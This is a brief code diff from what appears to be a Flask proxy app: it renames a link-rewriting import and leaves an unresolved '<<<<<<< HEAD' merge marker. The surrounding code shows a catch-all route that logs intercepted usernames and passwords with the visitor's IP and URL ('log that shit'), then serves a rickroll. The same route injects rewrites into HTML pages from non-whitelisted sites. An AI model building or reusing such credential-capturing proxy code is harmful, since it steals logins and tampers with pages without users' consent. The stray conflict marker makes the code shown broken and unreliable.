@@ -7,7 +7,7 @@ from bs4 import BeautifulSoup
 from flask import Flask, render_template, send_from_directory, abort, redirect, url_for, request, make_response, Response, stream_with_context, send_file, jsonify
 import pyjade
 from StringIO import StringIO
-from linkreplace import hack
+from linkreplace import anchorsToRickRoll
 
 PARSE = "https://api.parse.com/1/"
 CLASSES = "classes/"
@@ -125,6 +125,7 @@ def catch_all(path):
       # log that shit
       store_credentials(ip, url, u, p)
       return simple_rr(url, ip, u, p)
+<<<<<<< HEAD
   # hack the page if it's not on the whitelist and is actually HTML
   elif url.split("/")[2] not in whitelist and "text/html" in r.headers.get('content-type'):
     return Response(hack(r.text))
